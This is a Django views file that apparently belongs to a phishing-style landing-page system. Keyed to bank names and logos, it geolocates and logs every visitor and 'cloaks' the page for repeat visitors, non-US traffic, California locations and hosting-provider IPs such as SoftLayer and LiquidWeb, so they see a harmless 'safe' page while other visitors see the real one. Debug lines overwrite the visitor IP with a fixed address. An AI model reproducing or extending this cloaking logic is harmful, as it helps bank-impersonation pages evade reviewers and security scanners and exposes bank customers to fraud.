# Create your views here.

from django.shortcuts import render_to_response, HttpResponse
from django.conf import settings
from .models import Keyword, LandingPage, Visitor
from pygeoip import GeoIP
import datetime

geoip = GeoIP(settings.GEOIP_DB_PATH)

def get_landing_page(request, bank_keyword, lp='lp5'):
    v = save_visitor(request, bank_keyword, lp)
    try:
        bank = Keyword.objects.get(keyword=bank_keyword)
    except Keyword.DoesNotExist:
        return HttpResponse('Bank not found in system')
    logo = bank.image.url
    if v.cloaked:
        return render_to_response('%s/safe.html' % lp,locals())
    return render_to_response('%s/index.html' % lp,locals())


def ip_details(request):
    ip =  request.META.get('HTTP_X_REAL_IP', '')
    ip = request.META['REMOTE_ADDR']
    ip = '93.174.93.224'
    geo_data = geoip.record_by_addr(ip)
    print(geo_data)
    return HttpResponse(geo_data.items())



bad_ips = [#'208.43.90.178',
           '50.28.69.79',
           '67.227.83.121'
           ]

#USE ONLY LOWERCASE
organizations = ['softlayer',
                 'liquidweb']

cities = [#'dallas',
          'irvine',
          'los angeles']
states = ['california',]
allowed_country = ['us']

def legitimate_visitor(ip, geo_data, v):
    visits = Visitor.objects.filter(ip=ip)
    print(visits)
    if visits:
        return 'more than 1 visit'
    if geo_data['city'].lower() in cities:
        return 'city'
    if geo_data['region_name'].lower() in states:
        return 'region_name'
    if not geo_data['country_code'].lower() in allowed_country:
        return 'country_code'
    if ip in bad_ips:
        return 'ip'
    return ''


def save_visitor(request, keyword, lp):
    v = Visitor()
    v.visit_datetime = datetime.datetime.now()
    v.ip = request.META.get('HTTP_X_REAL_IP', '')
    v.ip = '208.43.90.178'
    v.ua = request.META['HTTP_USER_AGENT'][:100]
    v.keyword = keyword
    v.lp = lp
    v.dt = datetime.datetime.now()
    geo_data = geoip.record_by_addr(v.ip)
    v.city = geo_data['city']
    v.state = geo_data['region_name']
    v.county_code = geo_data['country_code']
    v.zip_code = geo_data['postal_code']
    print(legitimate_visitor(v.ip, geo_data, v))
    if not legitimate_visitor(v.ip, geo_data, v):
        v.cloaked = False #no need to cloak
    else:
        v.cloaked = True
        print('Cloaking needed')
    v.save()
    return v
